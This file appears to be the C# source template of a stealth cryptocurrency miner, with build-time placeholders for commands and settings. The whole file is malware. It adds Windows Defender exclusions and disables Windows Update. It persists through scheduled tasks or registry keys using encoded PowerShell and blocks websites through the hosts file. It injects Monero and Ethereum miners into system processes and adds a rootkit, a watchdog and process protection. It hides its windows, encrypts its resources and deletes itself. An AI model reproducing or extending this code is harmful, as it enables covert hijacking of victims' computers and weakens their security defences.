using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Collections.Generic;
#if DefDebug
using System.Windows.Forms;
#endif

#if DefAssembly
[assembly: AssemblyTitle("%Title%")]
[assembly: AssemblyDescription("%Description%")]
[assembly: AssemblyCompany("%Company%")]
[assembly: AssemblyProduct("%Product%")]
[assembly: AssemblyCopyright("%Copyright%")]
[assembly: AssemblyTrademark("%Trademark%")]
[assembly: AssemblyFileVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")]
#endif

public partial class _rMiner_
{
    private static void Main()
    {
        try
        {
            try
            {
#if DefWDExclusions
            
                _rCommand_("#SPOWERSHELL", "#WDCOMMANDS", true);
#endif
#if DefStartDelay
                Thread.Sleep(startDelay * 1000);
#endif
#if DefDisableWindowsUpdate
                _rCommand_("#SCMD", "#WUPDATE");
#endif
#if DefDisableSleep
                _rCommand_("#SCMD", "#POWERCFG");
#endif
            }
#if !DefDebug
            catch { }
#else
            catch (Exception ex)
            {
                MessageBox.Show("MBC: " + Environment.NewLine + ex.ToString());
            }
#endif
#if DefBlockWebsites
            try
            {
                string _rhostspath_ = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "#HOSTSPATH");
                string _rhostscontent_ = File.ReadAllText(_rhostspath_);

                string[] _rdomainset_ = new string[] { DOMAINSET };
                using (StreamWriter _rw_ = File.AppendText(_rhostspath_))
                {
                    foreach (string _rset_ in _rdomainset_)
                    {
                        string _rcur_ = _rGetString_(_rset_);
                        if (!_rhostscontent_.Contains(" " + _rcur_))
                        {
                            _rw_.Write(string.Format("#HOSTSFORMAT", _rcur_));
                        }
                    }
                }
            }
#if !DefDebug
            catch { }
#else
            catch (Exception ex)
            {
                MessageBox.Show("MBW: " + Environment.NewLine + ex.ToString());
            }
#endif
#endif
            string _rbD_ = Path.Combine(Environment.GetFolderPath($LIBSROOT), "#LIBSPATH");
#if DefInstall
            try
            {
                string _rplp_ = PayloadPath;    
#if DefShellcode
                string _rcmdl_ = Environment.GetCommandLineArgs()[1];
#else
                string _rcmdl_ = Assembly.GetExecutingAssembly().Location;
#endif
                bool _risAdmin_ = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
                Directory.CreateDirectory(Path.GetDirectoryName(_rplp_)); 
                if(_risAdmin_)
                {
                    if (Environment.OSVersion.Version < new Version(6, 2))
                    {
                        _rCommand_("#SCMD", string.Format("#WIN7TASKSCHADD", _rplp_), true);
                    }
                    else
                    {
                        _rCommand_("#SPOWERSHELL", string.Format("#ECTEMPLATE", Convert.ToBase64String(Encoding.Unicode.GetBytes(string.Format("#TASKSCHADD", _rplp_.Replace("'", "''"))))), true);
                    }
                }
                else
                {
                    _rCommand_("#SCMD", string.Format("#REGADD", _rplp_));
                }

                if (!_rcmdl_.Equals(_rplp_, StringComparison.CurrentCultureIgnoreCase))
                {
                    string _rpayloadcommand_ = string.Format("#ECTEMPLATE", Convert.ToBase64String(Encoding.Unicode.GetBytes(string.Format("#STARTPROGRAM", _rplp_.Replace("'", "''")))));
#if DefNoMinerOverwrite
                    if(File.Exists(_rplp_)){
#if DefRunInstall
                        _rCommand_("#SPOWERSHELL", _rpayloadcommand_);
#endif
                        Environment.Exit(0);
                    }
#endif
#if DefRootkit
                    try
                    {
                        _rInject_(_rExtractFile_(_rGetTheResource_("#RES_rootkit_i"), "st"), Path.Combine(Directory.GetParent(Environment.SystemDirectory).FullName, "#CONHOST"), "", false);                  
                    }
#if !DefDebug
                    catch { }
#else
                    catch (Exception ex)
                    {
                        MessageBox.Show("MRK: " + Environment.NewLine + ex.ToString());
                    }
#endif
#endif
#if DefWatchdog
                    foreach (Process proc in Process.GetProcessesByName("#WATCHDOGNAME"))
                    {
                        proc.Kill();
                    }
#endif
                    try{       
                        File.Copy(_rcmdl_, _rplp_, true);
#if DefRunInstall
                        if(_risAdmin_)
                        {
                            _rCommand_("#SCMD", "#TASKSCHSTART");
                        }
                        else
                        {
                            Thread.Sleep(2000);
                            _rCommand_("#SPOWERSHELL", _rpayloadcommand_);
                        }
#endif
                    }
#if !DefDebug
                    catch { }
#else
                    catch (Exception ex)
                    {
                        MessageBox.Show("MAE: " + Environment.NewLine + ex.ToString());
                    }
#endif
#if DefAutoDelete
                    _rCommand_("#SCMD", string.Format("#CMDDELETE", _rcmdl_));
#endif
                    Environment.Exit(0);
                }
            }
#if !DefDebug
            catch { }
#else
            catch (Exception ex)
            {
                MessageBox.Show("MFI: " + Environment.NewLine + ex.ToString());
            }
#endif
#endif

            List<int> _rpids_ = new List<int> { };

            try
            {
                try
                {
                    Directory.CreateDirectory(_rbD_);
#if DefWatchdog
                    if (!_rFindWatchdog_())
                    {
#if DefMemoryWatchdog
                        _rpids_.Add(_rInject_(_rGetTheResource_("#RES_watchdog"), Path.Combine(Directory.GetParent(Environment.SystemDirectory).FullName, "#WATCHDOGINJ"), "#WATCHDOGID", true));
#else
                        string _rbD2_ = Path.Combine(Environment.GetFolderPath($LIBSROOT), "#WATCHDOGPATH");
                        Directory.CreateDirectory(_rbD2_);
                        File.WriteAllBytes(Path.Combine(_rbD2_, "#WATCHDOGNAME" + "#STREXE"), _rGetTheResource_("#RES_watchdog"));

                        Process.Start(new ProcessStartInfo
                        {
                            FileName = Path.Combine(_rbD2_, "#WATCHDOGNAME" + "#STREXE"),
                            WorkingDirectory = _rbD2_,
                            WindowStyle = ProcessWindowStyle.Hidden,
                            CreateNoWindow = true
                        });
#endif
                    }
#endif
#if DefXMR
                    File.WriteAllBytes(Path.Combine(_rbD_, "#WR64"), _rGetTheResource_("#RES_winring"));
#endif
                }
#if !DefDebug
                catch { }
#else
                catch (Exception ex)
                {
                    MessageBox.Show("MW: " + Environment.NewLine + ex.ToString());
                }
#endif

                byte[] _rxmr_ = { };
                byte[] _reth_ = { };

                bool _rGPU_ = _rGetGPU_();

#if DefGPU
                try
                {
                    if (_rGPU_)
                    {
                        byte[] _rli_ = _rGetTheResource_("#RES_libs");

                        if (_rli_.Length > 0) {
                            using (var _rarchive_ = new ZipArchive(new MemoryStream(_rli_)))
                            {
                                foreach (ZipArchiveEntry _rentry_ in _rarchive_.Entries){
                                    _rentry_.ExtractToFile(Path.Combine(_rbD_, _rentry_.FullName), true);
                                }
                            }
                        }
                    }
                }
#if !DefDebug
                catch { }
#else
                catch (Exception ex)
                {
                    MessageBox.Show("MLE: " + Environment.NewLine + ex.ToString());
                }
#endif
#endif

                try
                {
#if DefXMR
                    _rxmr_ = _rExtractFile_(_rGetTheResource_("#RES_xmr"), "x");
#endif
#if DefETH

                    _reth_ = _rExtractFile_(_rGetTheResource_("#RES_eth"), "e");
#endif

                    string _rrunningminers_ = _rGetMiners_();

                    string[][] _rminerset_ = new string[][] { MINERSET };

                    foreach (string[] _set_ in _rminerset_)
                    {
                        if (!_rrunningminers_.Contains(_set_[0]) && (_set_[1] == "#XID" || (_set_[1] == "#EID" && _rGPU_)))
                        {
                            _rpids_.Add(_rInject_((_set_[1] == "#XID" ? _rxmr_ : _reth_), Path.Combine(Directory.GetParent(Environment.SystemDirectory).FullName, _rGetString_(_set_[3])), _set_[2], false));
                        }
                    }

#if DefProcessProtect
                    Thread.Sleep(200);
                    _rProtect_(_rpids_.ToArray());
#endif

                }
#if !DefDebug
                catch { }
#else
                catch (Exception ex)
                {
                    MessageBox.Show("MMR: " + Environment.NewLine + ex.ToString());
                }
#endif
            }
#if !DefDebug
            catch { }
#else
            catch (Exception ex)
            {
                MessageBox.Show("MMC: " + Environment.NewLine + ex.ToString());
            }
#endif
        }
#if !DefDebug
        catch { }
#else
        catch (Exception ex)
        {
            MessageBox.Show("MFC: " + Environment.NewLine + ex.ToString());
        }
#endif
        Environment.Exit(0);
    }

    private static byte[] _rGetTheResource_(string _rarg1_)
    {
        var MyResource = new System.Resources.ResourceManager("#RES_parent", Assembly.GetExecutingAssembly());
        return _rAESMethod_((byte[])MyResource.GetObject(_rarg1_));
    }


    private static string _rGetString_(string _rarg1_)
    {
#if DefObfuscate
        return Encoding.UTF8.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
#else
        return _rarg1_;
#endif
    }

    private static bool _rGetGPU_()
    {
        try
        {
            string _rarg7_ = "";

            var _rarg4_ = new ConnectionOptions();
            _rarg4_.Impersonation = ImpersonationLevel.Impersonate;
            var _rarg5_ = new ManagementScope("#WMISCOPE", _rarg4_);
            _rarg5_.Connect();

            var rarg6 = new ManagementObjectSearcher(_rarg5_, new ObjectQuery("#GPUQUERY")).Get();
            foreach (ManagementObject MemObj in rarg6)
            {
                _rarg7_ += (" " + MemObj["#STRVIDEOP"] + " " + MemObj["#STRNAME"]);
            }

            return _rarg7_.IndexOf("#STRNVIDIA", StringComparison.OrdinalIgnoreCase) >= 0 || _rarg7_.IndexOf("#STRAMD", StringComparison.OrdinalIgnoreCase) >= 0;
        }
#if !DefDebug
        catch { }
#else
        catch (Exception ex)
        {
            MessageBox.Show("FGE: " + Environment.NewLine + ex.ToString());
        }
#endif
        return false;
    }

    private static string _rGetMiners_()
    {
        string _rminers_ = "";

        var _rarg1_ = new ConnectionOptions();
        _rarg1_.Impersonation = ImpersonationLevel.Impersonate;
        var _rarg2_ = new ManagementScope("#WMISCOPE", _rarg1_);
        _rarg2_.Connect();

        var _rarg3_ = new ManagementObjectSearcher(_rarg2_, new ObjectQuery("#MINERQUERY")).Get();
        foreach (ManagementObject MemObj in _rarg3_)
        {
            if (MemObj != null && MemObj["#STRCMDLINE"] != null && MemObj["#STRCMDLINE"].ToString().Contains("#MINERID"))
            {
                _rminers_ += MemObj["#STRCMDLINE"].ToString();
            }
        }
        return _rminers_;
    }

#if DefWatchdog
    private static bool _rFindWatchdog_()
    {
        try
        {
            var _rarg1_ = new ConnectionOptions();
            _rarg1_.Impersonation = ImpersonationLevel.Impersonate;
            var _rarg2_ = new ManagementScope("#WMISCOPE", _rarg1_);
            _rarg2_.Connect();

            var _rarg3_ = new ManagementObjectSearcher(_rarg2_, new ObjectQuery("#WATCHDOGQUERY")).Get();
            foreach (ManagementObject MemObj in _rarg3_)
            {
                if (MemObj != null && MemObj["#STRCMDLINE"] != null && MemObj["#STRCMDLINE"].ToString().Contains("#WATCHDOGID"))
                {
                    return true;
                }
            }
        }
#if !DefDebug
        catch { }
#else
        catch (Exception ex)
        {
            MessageBox.Show("FWE: " + Environment.NewLine + ex.ToString());
        }
#endif
        return false;
    }
#endif

    private static void _rCommand_(string _rarg1_, string _rarg2_, bool _rwait_ = false)
    {
        try
        {
            var _rproc_ = Process.Start(new ProcessStartInfo
            {
                FileName = _rarg1_,
                Arguments = _rarg2_,
                WorkingDirectory = Environment.SystemDirectory,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            });
            if (_rwait_)
            {
                _rproc_.WaitForExit();
            }
        }
#if !DefDebug
        catch { }
#else
        catch (Exception ex)
        {
            MessageBox.Show("RCE: " + Environment.NewLine + ex.ToString());
        }
#endif
    }

    private static byte[] _rExtractFile_(byte[] _rinput_, string _rcontains_)
    {
        try
        {
            using (var _rarchive_ = new ZipArchive(new MemoryStream(_rinput_)))
            {
                foreach (ZipArchiveEntry _rentry_ in _rarchive_.Entries)
                {
                    if (_rentry_.FullName.Contains(_rcontains_))
                    {
                        using (var _rstreamdata_ = _rentry_.Open())
                        {
                            using (var _rms_ = new MemoryStream())
                            {
                                _rstreamdata_.CopyTo(_rms_);
                                return _rms_.ToArray();
                            }
                        }
                    }
                }
            }
        }
#if !DefDebug
        catch { }
#else
        catch (Exception ex)
        {
            MessageBox.Show("EFE: " + Environment.NewLine + ex.ToString());
        }
#endif
        return new byte[] { };
    }

    private static int _rInject_(byte[] _rpayload_, string _rinjectionpath_, string _rarguments_, bool _rshellcode_)
    {
        try
        {
            return _rDllLoader_("#DLLLOADMETHOD", new object[] { _rGetTheResource_("#RES_processinject"), "#INJECTMETHOD", _rpayload_, _rinjectionpath_, _rarguments_, _rshellcode_ });
        }
#if !DefDebug
        catch { }
#else
        catch (Exception ex)
        {
            MessageBox.Show("PIE: " + Environment.NewLine + ex.ToString());
        }
#endif
        return 0;
    }

#if DefProcessProtect
    private static int _rProtect_(int[] _rpids_)
    {
        try
        {
            return _rDllLoader_("#DLLPROTECTMETHOD", new object[] { _rGetTheResource_("#RES_processprotect"), "#PROTECTMETHOD", _rpids_, true });
        }
#if !DefDebug
        catch { }
#else
        catch (Exception ex)
        {
            MessageBox.Show("PPI: " + Environment.NewLine + ex.ToString());
        }
#endif
        return 0;
    }
#endif

    private static int _rDllLoader_(string _rmethod_, object[] _rarguments_)
    {
        try
        {
            return (int)Assembly.Load(_rGetTheResource_("#RES_dllloader")).GetType("#DLLLOADERTYPE").GetMethod(_rmethod_, BindingFlags.Public | BindingFlags.Static).Invoke(null, _rarguments_);
        }
#if !DefDebug
        catch { }
#else
        catch (Exception ex)
        {
            MessageBox.Show("DLE: " + Environment.NewLine + ex.ToString());
        }
#endif
        return 0;
    }

    private static byte[] _rAESMethod_(byte[] _rinput_, bool _rencrypt_ = false)
    {
#if DefObfuscate
        var _rkeybytes_ = new Rfc2898DeriveBytes(@"#AESKEY", Encoding.ASCII.GetBytes(@"#SALT"), 100).GetBytes(16);
        using (Aes _raesAlg_ = Aes.Create())
        {
            using (MemoryStream _rmsDecrypt_ = new MemoryStream())
            {
                using (CryptoStream _rcsDecrypt_ = new CryptoStream(_rmsDecrypt_, _rencrypt_ ? _raesAlg_.CreateEncryptor(_rkeybytes_, Encoding.ASCII.GetBytes(@"#IV")) : _raesAlg_.CreateDecryptor(_rkeybytes_, Encoding.ASCII.GetBytes(@"#IV")), CryptoStreamMode.Write))
                {
                    _rcsDecrypt_.Write(_rinput_, 0, _rinput_.Length);
                    _rcsDecrypt_.Close();
                }
                return _rmsDecrypt_.ToArray();
            }
        }
#else
        return _rinput_;
#endif
    }
}